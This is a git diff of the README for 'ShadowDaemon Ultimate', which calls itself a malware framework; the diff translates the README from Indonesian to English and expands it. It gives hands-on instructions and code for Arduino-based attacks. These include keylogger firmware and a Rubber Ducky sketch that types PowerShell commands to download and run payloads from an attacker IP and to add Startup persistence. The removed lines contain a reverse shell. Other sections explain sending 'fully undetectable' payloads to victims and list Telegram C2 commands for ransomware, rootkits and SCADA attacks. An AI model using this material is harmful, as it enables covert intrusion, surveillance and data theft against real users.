+    SD.remove("keylog.txt");
+    keylogFile = SD.open("keylog.txt", FILE_WRITE);
+    if (keylogFile) {
+      keylogFile.println("=== LOG CLEARED ===");
+      keylogFile.close();
+    }
+  }
+  Serial.println("[*] Log cleared!");
+}
+
+void sendStatus() {
+  Serial.println("=== STATUS ===");
+  Serial.print("Buffer size: ");
+  Serial.println(keylog.length());
+  Serial.print("SD Card: ");
+  Serial.println(sdCardReady ? "Ready" : "Not ready");
+  Serial.print("Uptime: ");
+  Serial.println(millis() / 1000);
+  Serial.println("===============");
+}
 ```
 
-**Untuk DigiSpark:**
-```
-File → Preferences
-Tambahkan URL:
-https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
+#### ⬆️ Step 3: Upload to Arduino
 
-Tools → Board → Boards Manager
-Cari "Digistump" → Install
+```
+1. Plug Arduino Nano to PC via USB
+2. Tools → Board → Arduino Nano
+3. Tools → Port → Select COMx (Windows) / dev/ttyUSB0 (Linux)
+4. Tools → Processor → ATmega328P (Old Bootloader)
+5. Click Upload (→) icon
+6. Wait for "Upload Complete!"
+```
+
+#### 🧪 Step 4: Test
+
+```
+1. Plug Arduino into target PC (looks like charger)
+2. Open Serial Monitor (Tools → Serial Monitor)
+3. Set baud rate: 9600
+4. Test commands:
+   - GET_LOG → Get all keylogs
+   - CLEAR_LOG → Clear keylogs
+   - STATUS → Check status
+```
+
+#### 📤 Step 5: Read Keylog from Termux
+
+```bash
+# Read keylog via serial
+python3 -c "
+import serial
+ser = serial.Serial('/dev/ttyUSB0', 9600, timeout=2)
+ser.write(b'GET_LOG\n')
+time.sleep(1)
+while ser.in_waiting:
+    print(ser.read(ser.in_waiting).decode())
+"
 ```
 
 ---
 
-### 🦆 Setup USB Rubber Ducky (Arduino Leonardo)
+### 🦆 USB Rubber Ducky (Arduino Leonardo)
 
-#### Step 1: Generate Payload di Termux
+#### 📦 Components Needed
+
+| No | Component | Price | Description |
+|----|-----------|-------|-------------|
+| 1 | Arduino Leonardo | Rp 100-150k | Main board (ATmega32u4) |
+| 2 | USB Cable | Rp 10-20k | Connect to PC |
+| 3 | Micro USB Cable | Rp 10-20k | Target connection |
+
+#### 💻 Step 1: Generate Payload in Termux
+
 ```bash
+# Generate payload
 create_ducky:reverse_shell
 # Output: ducky_script.txt
+
+# Other payloads:
+create_ducky:keylogger
+create_ducky:ransomware
+create_ducky:persistence
 ```
 
-#### Step 2: Convert ke Arduino Code
+#### 📝 Step 2: Upload to Arduino
+
 ```cpp
 // USB Rubber Ducky - Arduino Leonardo
 // イズミー Active 😈🔥
+// Full Payload - Reverse Shell + Keylogger + Persistence
 
 #include <Keyboard.h>
 
@@ -549,126 +888,107 @@ void setup() {
   Keyboard.begin();
   delay(2000);
   
-  // Buka Run (Windows Key + R)
+  // STAGE 1: Open Run
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(100);
   Keyboard.releaseAll();
   delay(500);
   
-  // Ketik perintah
-  Keyboard.println("powershell -Command \"$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
+  // STAGE 2: Download & Execute
+  Keyboard.println("powershell -Command \"$url='http://YOUR_IP/shadow.py';$path='%temp%\\shadow.py';Invoke-WebRequest -Uri $url -OutFile $path;Start-Process 'python' $path\"");
+  delay(1000);
+  Keyboard.press(KEY_RETURN);
+  delay(500);
   
+  // STAGE 3: Install Keylogger
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
   delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.println("powershell -Command \"Invoke-WebRequest -Uri 'http://YOUR_IP/keylogger.py' -OutFile '%temp%\\keylogger.py';Start-Process 'python' '%temp%\\keylogger.py'\"");
+  delay(1000);
+  Keyboard.press(KEY_RETURN);
+  delay(500);
+  
+  // STAGE 4: Persistence
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.println("powershell -Command \"$WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut('$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shadow.lnk');$Shortcut.TargetPath = '$env:temp\\shadow.exe';$Shortcut.Save()\"");
+  delay(1000);
+  Keyboard.press(KEY_RETURN);
+  delay(500);
+  
+  // STAGE 5: Cleanup
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.println("exit");
+  delay(500);
+  Keyboard.press(KEY_RETURN);
+  delay(500);
+  
   Keyboard.end();
 }
 
 void loop() {}
 ```
 
-**Ganti `YOUR_IP` dengan IP server lo!**
+**Replace `YOUR_IP` with your server IP!**
 
-#### Step 3: Upload ke Arduino
+#### ⬆️ Step 3: Upload to Arduino
+
 ```
-1. Colok Arduino Leonardo ke PC via USB
+1. Plug Arduino Leonardo to PC via USB
 2. Tools → Board → Arduino Leonardo
-3. Tools → Port → Pilih COMx (Windows) atau /dev/ttyACM0 (Linux)
-4. Klik Upload (→) icon
-5. Tunggu sampai selesai
+3. Tools → Port → Select COMx (Windows) / dev/ttyACM0 (Linux)
+4. Click Upload (→) icon
+5. Wait for "Upload Complete!"
 ```
 
-#### Step 4: Tes
+#### 🧪 Step 4: Test
+
 ```
-Colok Arduino ke PC target
-➜ Dalam 5 detik, malware jalan!
-```
-
----
-
-### ⌨️ Setup Hardware Keylogger (Arduino Nano/Uno)
-
-#### Step 1: Generate Firmware di Termux
-```bash
-setup_usb_keylogger
-# Output: usb_keylogger.ino
-```
-
-#### Step 2: Upload ke Arduino
-```cpp
-// Hardware Keylogger - Arduino Nano/Uno
-// イズミー Active 😈🔥
-
-#include <SoftwareSerial.h>
-
-#define RX 10
-#define TX 11
-SoftwareSerial mySerial(RX, TX);
-
-String keylog = "";
-
-void setup() {
-  Serial.begin(9600);
-  mySerial.begin(9600);
-  Serial.println("[*] Keylogger Ready");
-}
-
-void loop() {
-  // Baca dari serial
-  if (mySerial.available()) {
-    char c = mySerial.read();
-    keylog += c;
-    if (keylog.length() > 1024) {
-      keylog = "";
-    }
-  }
-  
-  // Kirim log via serial
-  if (Serial.available()) {
-    String cmd = Serial.readString();
-    if (cmd == "GET_LOG") {
-      Serial.println(keylog);
-      keylog = "";
-    }
-  }
-  
-  delay(10);
-}
-```
-
-#### Step 3: Upload ke Arduino
-```
-1. Colok Arduino Nano ke PC via USB
-2. Tools → Board → Arduino Nano
-3. Tools → Port → Pilih COMx
-4. Klik Upload
-```
-
-#### Step 4: Baca Keylog
-```bash
-# Di Termux
-python3 -c "
-import serial
-ser = serial.Serial('/dev/ttyUSB0', 9600, timeout=2)
-ser.write(b'GET_LOG')
-print(ser.read(ser.in_waiting).decode())
-"
+1. Plug Arduino Leonardo into target PC
+2. Within 5-10 seconds, malware will:
+   - Download shadow.py from your server
+   - Install keylogger
+   - Create persistence
+   - Hide windows
+3. You get access via Telegram!
 ```
 
 ---
 
-### 💰 Setup DigiSpark (Alternatif Murah)
+### 💰 DigiSpark (Cheap Alternative)
 
-#### Step 1: Install DigiSpark Board
+#### 📦 Components Needed
+
+| No | Component | Price |
+|----|-----------|-------|
+| 1 | DigiSpark | Rp 30-50k |
+| 2 | USB Cable | Rp 10-20k |
+
+#### 💻 Step 1: Install DigiSpark Board
+
 ```
 File → Preferences
-Tambahkan URL:
+Add URL:
 https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
 
 Tools → Board → Boards Manager
-Cari "Digistump" → Install
+Search "Digistump" → Install
 ```
 
-#### Step 2: Upload Payload
+#### 📝 Step 2: Upload Payload
+
 ```cpp
 // DigiSpark Payload
 // イズミー Active 😈🔥
@@ -687,25 +1007,28 @@ void setup() {
 void loop() {}
 ```
 
-#### Step 3: Upload
+**Replace `YOUR_IP` with your server IP!**
+
+#### ⬆️ Step 3: Upload
+
 ```
-1. Colok DigiSpark ke PC
+1. Plug DigiSpark to PC
 2. Tools → Board → Digistump AVR Boards → Digispark Default
 3. Tools → Programmer → Micronucleus
-4. Klik Upload
-5. Cabut dan colok lagi untuk trigger
+4. Click Upload
+5. Unplug and replug to trigger
 ```
 
 ---
 
-### 📊 Perbandingan Harga & Fungsi
+### 📊 Hardware Comparison
 
-| Perangkat | Harga | Fungsi | Kecepatan | Kesulitan |
-|-----------|-------|--------|-----------|-----------|
-| Arduino Leonardo | Rp 100-150k | Rubber Ducky | ⚡ Sangat Cepat | 🟢 Mudah |
-| Arduino Nano | Rp 50-100k | Keylogger | 🐢 Sedang | 🟡 Sedang |
-| DigiSpark | Rp 30-50k | Rubber Ducky | ⚡ Cepat | 🟢 Mudah |
-| USB Rubber Ducky Asli | Rp 500-800k | Rubber Ducky | ⚡ Sangat Cepat | 🟢 Mudah |
+| Device | Price | Function | Speed | Difficulty |
+|--------|-------|----------|-------|------------|
+| Arduino Leonardo | Rp 100-150k | Rubber Ducky | ⚡ Very Fast | 🟢 Easy |
+| Arduino Nano | Rp 50-100k | Keylogger | 🐢 Medium | 🟡 Medium |
+| DigiSpark | Rp 30-50k | Rubber Ducky | ⚡ Fast | 🟢 Easy |
+| USB Rubber Ducky Original | Rp 500-800k | Rubber Ducky | ⚡ Very Fast | 🟢 Easy |
 
 ---
 
@@ -718,30 +1041,41 @@ void loop() {}
 gen_payload
 
 # Output: payload_xxxxxx.py
-# File ini sudah di-enkripsi dan FUD (Fully Undetectable)
+# This file is encrypted and FUD (Fully Undetectable)
 ```
 
-### Kirim ke Target
+### Send to Target
 
 ```bash
-# 1. Kirim via Telegram/WhatsApp
-# 2. Target download dan jalankan:
+# 1. Send via Telegram/WhatsApp
+# 2. Target downloads and runs:
 python3 payload_xxxxxx.py
 
-# 3. Malware aktif, lo bisa kontrol dari Telegram!
+# 3. Malware is active, you can control via Telegram!
 ```
 
-### Buat .exe (Windows)
+### Create .exe (Windows)
 
 ```bash
 # Install pyinstaller
 pip install pyinstaller
 
-# Buat .exe
+# Create .exe
 pyinstaller --onefile --noconsole payload_xxxxxx.py
 
-# Hasil: dist/payload_xxxxxx.exe
-# Kirim ke target Windows
+# Result: dist/payload_xxxxxx.exe
+# Send to Windows target
+```
+
+### Generate Reverse Shell
+
+```bash
+# Generate reverse shell
+gen_reverse:192.168.1.100:4444
+
+# Output: reverse_shell.py
+# Run on target:
+python3 reverse_shell.py
 ```
 
 ---
@@ -768,14 +1102,58 @@ Find "chat":{"id": 123456789}
 ### Step 3: Update Config
 
 ```json
-"telegram_token": "123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ",
-"telegram_chat_id": "123456789"
+"telegram_token": "YOUR_BOT_TOKEN_FROM_BOTFATHER",
+"telegram_chat_id": "YOUR_CHAT_ID"
 ```
 
 ### Step 4: Test Bot
 
 ```bash
-curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" -d "chat_id=<CHAT_ID>&text=ShadowDaemon%20aktif!"
+curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" -d "chat_id=<CHAT_ID>&text=ShadowDaemon%20active!"
+```
+
+### Step 5: Set Commands
+
+```
+/setcommands
+```
+
+**Copy-paste:**
+```
+info - Show system information
+help - Show all available commands
+shell - Execute shell command on target
+screenshot - Take screenshot of target screen
+webcam - Capture webcam image
+mic - Record microphone (10 seconds)
+record_screen - Record screen (30 seconds)
+keylog_start - Start keylogger
+keylog_stop - Stop keylogger
+keylog_get - Get captured keystrokes
+ransomware - Encrypt files with AES-256
+ddos - DDoS attack on target IP
+knock - Port knocking to bypass firewall
+network_exploit - Network exploitation attack
+industrial_flood - Flood industrial/SCADA protocols
+miner_start - Start cryptocurrency mining
+miner_stop - Stop cryptocurrency mining
+persist - Install persistence (auto-start)
+hide_self - Hide process from task manager
+wipe_trails - Wipe forensic evidence
+usb_spread - Auto-infect USB drives
+setup_usb_keylogger - Setup hardware keylogger
+create_ducky - Generate USB Rubber Ducky payload
+install_bootkit - Infect bootloader (GRUB/Syslinux)
+install_bios_rootkit - Infect BIOS/UEFI firmware
+install_cpu_backdoor - CPU microcode backdoor injection
+trigger_smm - Trigger SMM (System Management Mode) backdoor
+scan_plc - Scan for PLC/SCADA devices
+stuxnet - Deploy Stuxnet-style payload
+gen_payload - Generate FUD payload
+crypt_binary - Encrypt binary file
+mouse - Control mouse remotely
+type - Type text remotely
+selfdestruct - Self-destruct malware
 ```
 
 ---
@@ -791,14 +1169,14 @@ pip install -r requirements.txt
 
 #### Permission Denied (/tmp)
 ```bash
-# Bikin file di folder project
+# Create file in project folder
 touch .shadow_key
 chmod 666 .shadow_key
 ```
 
 #### JSONDecodeError
 ```bash
-# Bikin config.json baru
+# Create new config.json
 cat > config.json << 'EOF'
 {
     "c2_type": "telegram",
@@ -820,27 +1198,58 @@ sudo apt install linux-headers-$(uname -r)
 cd kernel && make
 ```
 
+#### Command Not Found
+- Make sure module file exists in `modules/`
+- Check `modules/__init__.py` imports
+- Restart ShadowDaemon
+
+#### bcrypt/pynacl Build Failed (Termux)
+```bash
+pkg install python-bcrypt python-pynacl python-paramiko -y
+```
+
+#### Arduino Not Detected
+```bash
+# Check connection
+lsusb
+
+# Check permissions
+sudo chmod 666 /dev/ttyUSB0
+
+# On Termux
+ls /dev/ttyUSB*
+```
+
 ---
 
 ## ❓ FAQ
 
-### Q: Apa itu ShadowDaemon Ultimate?
-**A:** Framework malware lengkap untuk Linux/Termux dengan 30+ modul dari basic hingga kernel rootkit.
+### Q: What is ShadowDaemon Ultimate?
+**A:** A complete malware framework for Linux/Termux with 100+ modules from basic to AI-based attacks.
 
-### Q: Apakah ini ilegal?
-**A:** Ya, jika digunakan tanpa izin. Hanya untuk edukasi dan testing sendiri.
+### Q: Is this illegal?
+**A:** Yes, if used without authorization. For educational and self-testing only.
 
-### Q: Bagaimana cara setup Telegram bot?
-**A:** Cari @BotFather di Telegram, buat bot, copy token, dan dapatkan chat ID dari getUpdates.
+### Q: How to setup Telegram bot?
+**A:** Search @BotFather on Telegram, create bot, copy token, and get chat ID from getUpdates.
 
-### Q: Apakah bisa jalan di Windows?
-**A:** Tidak, khusus Linux. Tapi payload bisa untuk Windows (Rubber Ducky).
+### Q: Can it run on Windows?
+**A:** No, Linux only. But payloads can target Windows (Rubber Ducky, exe builder).
 
-### Q: Berapa biaya untuk hardware keylogger?
-**A:** Rp 50-300 ribu untuk Arduino/Teensy.
+### Q: How much does hardware keylogger cost?
+**A:** Rp 50-300k for Arduino/Teensy.
 
-### Q: Apakah kernel rootkit berbahaya?
-**A:** Ya, bisa bikin sistem crash atau brick. Hanya untuk testing di lab.
+### Q: Is kernel rootkit dangerous?
+**A:** Yes, can crash or brick the system. Only for lab testing.
+
+### Q: How to update ShadowDaemon?
+**A:** Use command `auto_update` or `git pull` and restart.
+
+### Q: Why some commands don't work on Termux?
+**A:** Some features need hardware (screenshot, webcam) or root (kernel module, bootkit).
+
+### Q: What is the difference between Arduino Nano and Leonardo?
+**A:** Nano is for keylogger, Leonardo is for USB Rubber Ducky (has keyboard emulation).
 
 ---
 
@@ -873,7 +1282,7 @@ This project is licensed under the **MIT License**.
 ```
 MIT License
 
-Copyright (c) 2024 イズミー
+Copyright (c) 2026 イズミー
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -900,14 +1309,14 @@ SOFTWARE.
 
 If you find this project useful, please give it a star on GitHub!
 
-[![GitHub stars](https://img.shields.io/github/stars/yourusername/ShadowDaemon_Ultimate.svg?style=social&label=Star)](https://github.com/yourusername/ShadowDaemon_Ultimate)
+[![GitHub stars](https://img.shields.io/github/stars/hidayat-tanjung/ShadowDaemon_Ultimate.svg?style=social&label=Star)](https://github.com/hidayat-tanjung/ShadowDaemon_Ultimate)
 
 ---
 
 <div align="center">
   <sub>Built with 🔥 by イズミー</sub>
   <br>
-  <sub>© 2024 ShadowDaemon Ultimate Edition</sub>
+  <sub>© 2026 ShadowDaemon Ultimate Edition v4.0</sub>
   <br>
   <sub>⚠️ For Educational Purposes Only ⚠️</sub>
   <br>
